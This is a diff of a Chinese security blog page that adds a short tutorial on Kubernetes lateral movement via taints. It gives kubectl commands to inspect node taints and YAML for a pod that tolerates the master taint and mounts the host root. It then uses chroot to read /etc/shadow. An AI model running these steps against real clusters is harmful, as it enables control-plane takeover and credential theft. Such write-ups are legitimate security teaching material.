@@ -1,18 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="K8S污点横移">
 <title>K8S横向移动</title>
 
 <link rel='canonical' href='https://lserein.github.io/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/'>
 
 <link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="K8S横向移动">
-<meta property='og:description' content="">
+<meta property='og:description' content="K8S污点横移">
 <meta property='og:url' content='https://lserein.github.io/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/'>
 <meta property='og:site_name' content='Lsec&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-22T17:04:52&#43;08:00'/><meta property='article:modified_time' content='2026-01-22T17:05:23&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-22T17:04:52&#43;08:00'/><meta property='article:modified_time' content='2026-01-26T16:57:13&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/logo.png' />
 <meta name="twitter:title" content="K8S横向移动">
-<meta name="twitter:description" content="">
+<meta name="twitter:description" content="K8S污点横移"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/logo.png' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
   
@@ -248,13 +249,69 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1k8s污点taint横向移动">1.K8S污点(Taint)横向移动</a>
+      <ol>
+        <li><a href="#11判断能否使用污点横移">1.1.判断能否使用污点横移</a></li>
+        <li><a href="#12横向移动">1.2.横向移动</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+                <img src="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/logo_hu4b7c2b2fb67c764c7fd87d2b9334b49a_781605_800x0_resize_box_3.png"
+                        srcset="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/logo_hu4b7c2b2fb67c764c7fd87d2b9334b49a_781605_800x0_resize_box_3.png 800w, /p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/logo_hu4b7c2b2fb67c764c7fd87d2b9334b49a_781605_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="403" 
+                        loading="lazy"
+                        alt="Featured image of post K8S横向移动" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+    </header>
     
 
     <div class="article-title-wrapper">
@@ -262,6 +319,10 @@
             <a href="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">K8S横向移动</a>
         </h2>
     
+        
+        <h3 class="article-subtitle">
+            K8S污点横移
+        </h3>
         
     </div>
 
@@ -296,7 +357,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 0 分钟
+                    阅读时长: 2 分钟
                 </time>
             </div>
         
@@ -311,7 +372,198 @@
     <section class="article-content">
     
     
-    
+    <h2 id="1k8s污点taint横向移动">1.K8S污点(Taint)横向移动
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/9FYgUdSMTARwZMM2-cR6dQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/9FYgUdSMTARwZMM2-cR6dQ</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/A-3my_vazn1hQs7b422fHA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/A-3my_vazn1hQs7b422fHA</a></p>
+<p><a class="link" href="https://cn-sec.com/archives/1336486.html"  target="_blank" rel="noopener"
+    >https://cn-sec.com/archives/1336486.html</a></p>
+<p><strong>攻击者在获取到node节点的权限后可以通过kubectl来创建一个能够容忍主节点的污点的Pod，当该Pod被成功创建到Master上之后，攻击者可以通过在子节点上操作该Pod实现对主节点的控制</strong></p>
+<h3 id="11判断能否使用污点横移">1.1.判断能否使用污点横移
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">kubectl</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">66</span><span class="p">.</span><span class="na">146</span><span class="p">:</span><span class="n">8080</span><span class="w"> </span><span class="n">describe</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">node1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">重点观察这个字段</span><span class="err">：</span><span class="n">Taints</span><span class="p">:</span><span class="w">             </span><span class="o">&lt;</span><span class="n">none</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/1.png"
+	width="2402"
+	height="901"
+	srcset="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/1_hubd6b1e281ebcdd097b4a3bd8a056bd24_186262_480x0_resize_box_3.png 480w, /p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/1_hubd6b1e281ebcdd097b4a3bd8a056bd24_186262_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="266"
+		data-flex-basis="639px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">kubectl</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">66</span><span class="p">.</span><span class="na">146</span><span class="p">:</span><span class="n">8080</span><span class="w"> </span><span class="n">describe</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">master</span><span class="o">-</span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//可以进行横向移动输出如下</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Taints</span><span class="p">:</span><span class="w">             </span><span class="n">node</span><span class="o">-</span><span class="n">role</span><span class="p">.</span><span class="na">kubernetes</span><span class="p">.</span><span class="na">io</span><span class="o">/</span><span class="n">master</span><span class="p">:</span><span class="n">NoSchedule</span><span class="w">  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/2.png"
+	width="2016"
+	height="1010"
+	srcset="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/2_huc1fa3a572e2b95a4217f1027c74e515f_187741_480x0_resize_box_3.png 480w, /p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/2_huc1fa3a572e2b95a4217f1027c74e515f_187741_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="479px"
+	
+></p>
+<p><strong>污点一般有三种值：</strong></p>
+<p><strong>NoSchedule: 禁止调度新的 Pod 到该节点。</strong></p>
+<p><strong>PreferNoSchedule: 优先避免将 Pod 调度到该节点，但不是强制性的。</strong></p>
+<p><strong>NoExecute: 禁止新的 Pod 调度到该节点，并驱逐不容忍该污点的现有 Pod。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//查看node节点归属</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">kubectl</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">66</span><span class="p">.</span><span class="na">146</span><span class="p">:</span><span class="n">8080</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">pods</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">wide</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到test节点归属于node1这台机器，即使逃逸出来也是拿下node1这台主机</p>
+<p><img src="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/3.png"
+	width="1585"
+	height="202"
+	srcset="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/3_hue5bd70479e5c9fa00745202cfa048fc6_33017_480x0_resize_box_3.png 480w, /p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/3_hue5bd70479e5c9fa00745202cfa048fc6_33017_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="784"
+		data-flex-basis="1883px"
+	
+></p>
+<h3 id="12横向移动">1.2.横向移动
+</h3><p>创建带有容忍参数的Pod(必要时可以修改Yaml使Pod增加到特定的Node上去)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">x</span><span class="p">.</span><span class="na">yaml</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">EOF</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="n">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kind</span><span class="p">:</span><span class="w"> </span><span class="n">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">control</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="n">15</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">tolerations</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">key</span><span class="p">:</span><span class="w"> </span><span class="n">node</span><span class="o">-</span><span class="n">role</span><span class="p">.</span><span class="na">kubernetes</span><span class="p">.</span><span class="na">io</span><span class="o">/</span><span class="n">master</span><span class="w">       </span><span class="c1">//这个替换为可以横向移动的输出</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">operator</span><span class="p">:</span><span class="w"> </span><span class="n">Exists</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">effect</span><span class="p">:</span><span class="w"> </span><span class="n">NoSchedule</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">control</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="n">15</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">image</span><span class="p">:</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">cn</span><span class="o">-</span><span class="n">hangzhou</span><span class="p">.</span><span class="na">aliyuncs</span><span class="p">.</span><span class="na">com</span><span class="o">/</span><span class="n">library</span><span class="o">/</span><span class="n">ubuntu</span><span class="p">:</span><span class="n">18</span><span class="p">.</span><span class="na">04</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">command</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="s">&#34;/bin/sleep&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3650d&#34;</span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">volumeMounts</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">master</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">mountPath</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">master</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">master</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">hostPath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">path</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">type</span><span class="p">:</span><span class="w"> </span><span class="n">Directory</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">EOF</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">创建Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">kubectl</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">control</span><span class="o">-</span><span class="n">master</span><span class="p">.</span><span class="na">yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">部署情况</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">kubectl</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">deploy</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">wide</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">Pod详情</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">kubectl</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">pod</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">wide</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/4.png"
+	width="1716"
+	height="291"
+	srcset="/p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/4_hu2661bbe47e7365a2ff6b1182a423a9c1_44332_480x0_resize_box_3.png 480w, /p/k8s%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image/4_hu2661bbe47e7365a2ff6b1182a423a9c1_44332_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="589"
+		data-flex-basis="1415px"
+	
+></p>
+<p>获得Master控制端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">kubectl</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">control</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="n">15</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="n">bash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chroot</span><span class="w"> </span><span class="o">/</span><span class="n">master</span><span class="w"> </span><span class="n">bash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -340,7 +592,7 @@
 
 
         <span>
-            最后更新于 Jan 22, 2026 17:05 &#43;0800
+            最后更新于 Jan 26, 2026 16:57 &#43;0800
         </span>
     </section></footer>
 
@@ -351,6 +603,113 @@
     
 
     
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/k8s%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/k8s%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.89bb8f54fc5c96249c42867fbf9e8b88_hu4b7c2b2fb67c764c7fd87d2b9334b49a_781605_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post K8S常见漏洞"
+                        
+                        data-hash="md5-ibuPVPxcliScQoZ/v56LiA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">K8S常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cve-2026-24061/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CVE 2026 24061</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/k8s%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">K8S安全环境搭建</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/logo.b78eccd4b2b803bd3e1d0be31b4df1fe_hu6d0ba24a779dd05fe97fcd76787ec38f_7738_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Docker安全攻防"
+                        
+                        data-hash="md5-t47M1LK4A70&#43;HQvjG03x/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Docker安全攻防</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.cf6b552cc3263892bc02ddaf07e6e7f6_hu7aa57c2307c5d87743a54f76552536bc_313547_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post XXL Job常见漏洞"
+                        
+                        data-hash="md5-z2tVLMMmOJK8At2vB&#43;bn9g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XXL Job常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
 
      
     
